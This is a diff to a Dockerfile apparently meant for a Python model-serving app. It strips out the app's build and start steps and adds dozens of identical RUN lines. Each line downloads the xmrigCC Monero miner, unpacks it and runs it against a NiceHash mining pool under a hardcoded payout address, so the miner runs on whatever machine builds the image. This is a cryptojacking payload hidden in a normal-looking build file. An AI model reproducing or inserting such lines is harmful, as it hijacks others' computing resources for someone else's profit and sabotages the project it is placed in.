+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+# Install python packages.
+
+# Add your model weight files
 # (in this case we have a python script)
-ADD download.py .
-RUN python3 download.py
+# Install python packages.
 
-# Add the rest of your code
-ADD . .
-
-EXPOSE 8000
-
-# Start the app in the container
-CMD python3 -u app.py
+# Add your model weight files
+# (in this case we have a python script)
